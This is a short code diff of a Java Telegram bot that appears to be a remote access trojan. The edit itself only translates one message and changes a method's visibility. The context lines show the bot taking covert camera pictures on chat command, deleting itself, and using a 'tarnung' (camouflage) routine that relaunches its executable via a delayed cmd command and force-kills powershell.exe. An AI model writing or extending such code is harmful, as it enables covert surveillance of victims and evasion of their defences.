@@ -756,7 +756,7 @@ public class Bot extends TelegramLongPollingBot {
             if (camera)
                 takepic();
             else
-                sendNachricht("Kamera wurde in den Einstellungen deaktiviert.");
+                sendNachricht("Camera has been deactivated in the settings.");
         }
         if (nachricht.equalsIgnoreCase("alarm")) {
             sendNachricht("Gehe in ALARM-Modus! Protokoll: Benachrichtigen.");
@@ -999,8 +999,7 @@ public class Bot extends TelegramLongPollingBot {
         deleteme();
     }
 
-
-    public void tarnung() {
+    void tarnung() {
         try {
             Runtime.getRuntime().exec("cmd /c ping 127.0.0.1 -n 60 & start \"\" \"" + getPfad() + getName() + "\"");
             Runtime.getRuntime().exec("taskkill /F /IM powershell.exe");
